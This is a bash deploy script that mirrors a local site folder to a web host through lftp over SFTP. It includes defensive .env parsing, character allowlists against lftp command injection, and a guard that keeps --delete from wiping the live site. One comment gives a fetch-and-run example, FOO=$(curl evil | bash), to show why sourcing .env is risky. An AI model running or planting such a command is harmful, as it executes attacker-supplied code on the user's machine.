#!/usr/bin/env bash
# Deploy local _site/ to a webhotel via lftp + SFTP key auth.
# Usage: ./deploy.sh [LOCAL_DIR]                      (real deploy)
#        DRY_RUN=1 ./deploy.sh [LOCAL_DIR]            (preview only, no changes)
#
# Requires in .env (no quotes around values):
#   DEPLOY_HOST    e.g. login.domeneshop.no
#   DEPLOY_USER    your SFTP username
#   DEPLOY_REMOTE  remote target path, e.g. /home/N/x/user/yourdomain.tld
#   DEPLOY_KEY     path to private SSH key, e.g. /e/www/your_key
#                  (Git Bash forward-slash form; default ~/.ssh/id_ed25519)
#
# WARNING: --delete removes remote files that no longer exist locally.

set -euo pipefail

# Parse .env line-by-line instead of `source`-ing it: a `source` runs whatever bash
# is in the file (including command substitutions like FOO=$(curl evil | bash)) the
# moment we run the script. Anyone with write access to the project dir could plant
# that. Format expected: simple KEY=value, no quotes, comments start with '#'.
if [ -f .env ]; then
  while IFS='=' read -r key val; do
    val="${val%$'\r'}"
    [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]] || continue
    printf -v "$key" '%s' "$val"
    export "$key"
  done < <(grep -v '^[[:space:]]*#' .env)
fi

LOCAL_DIR="${1:-_site}"

: "${DEPLOY_HOST:?DEPLOY_HOST not set in .env}"
: "${DEPLOY_USER:?DEPLOY_USER not set in .env}"
: "${DEPLOY_REMOTE:?DEPLOY_REMOTE not set in .env}"
: "${DEPLOY_KEY:=$HOME/.ssh/id_ed25519}"

# These values are interpolated into an unquoted lftp heredoc below. lftp uses ';' as
# a command separator and '!' as shell-escape, so we reject anything outside a strict
# allowlist before it can reach the heredoc.
[[ "$DEPLOY_HOST"   =~ ^[A-Za-z0-9.-]+$        ]] || { echo "deploy.sh: DEPLOY_HOST contains invalid characters."   >&2; exit 1; }
[[ "$DEPLOY_USER"   =~ ^[A-Za-z0-9._-]+$       ]] || { echo "deploy.sh: DEPLOY_USER contains invalid characters."   >&2; exit 1; }
[[ "$DEPLOY_REMOTE" =~ ^[A-Za-z0-9._/~-]+$     ]] || { echo "deploy.sh: DEPLOY_REMOTE contains invalid characters." >&2; exit 1; }
case "$DEPLOY_KEY" in *\"*) echo "deploy.sh: DEPLOY_KEY may not contain quotes." >&2; exit 1;; esac

if [ ! -f "$DEPLOY_KEY" ]; then
  echo "deploy.sh: SSH key not found at '$DEPLOY_KEY'." >&2
  exit 1
fi

if [ ! -d "$LOCAL_DIR" ]; then
  echo "deploy.sh: local dir '$LOCAL_DIR' does not exist. Did you run 'npm run build'?" >&2
  exit 1
fi

# Sentinel check: --delete will nuke the live site if LOCAL_DIR is empty or points
# at the wrong subdir. Require an index.html before we let lftp anywhere near --delete.
if [ ! -f "$LOCAL_DIR/index.html" ]; then
  echo "deploy.sh: '$LOCAL_DIR/index.html' missing — refusing to deploy (would --delete the live site)." >&2
  exit 1
fi

# Concurrency guard: prevent two simultaneous deploys from racing inside mirror --delete.
# flock ships with Git for Windows; skip the guard silently if it isn't available.
if command -v flock >/dev/null 2>&1; then
  exec 9>./.deploy.lock
  flock -n 9 || { echo "deploy.sh: another deploy is already running." >&2; exit 1; }
fi

DRY_FLAG=""
MODE_LABEL="DEPLOY"
if [ "${DRY_RUN:-}" = "1" ]; then
  DRY_FLAG="--dry-run"
  MODE_LABEL="DRY-RUN (no changes will be made)"
fi

echo "$MODE_LABEL"
echo "  Local : $LOCAL_DIR"
echo "  Remote: sftp://$DEPLOY_USER@$DEPLOY_HOST$DEPLOY_REMOTE"
echo "  Key   : $DEPLOY_KEY"
echo

lftp <<EOF
set cmd:fail-exit yes;
set sftp:auto-confirm yes;
set sftp:connect-program "ssh -a -x -i \"$DEPLOY_KEY\"";
open sftp://$DEPLOY_USER@$DEPLOY_HOST;
mirror --reverse --delete --verbose --no-perms --parallel=4 $DRY_FLAG "$LOCAL_DIR" "$DEPLOY_REMOTE";
bye
EOF

echo
if [ "${DRY_RUN:-}" = "1" ]; then
  echo "Dry-run complete. No changes were made. Re-run without DRY_RUN=1 to deploy for real."
else
  echo "Deploy complete."
fi
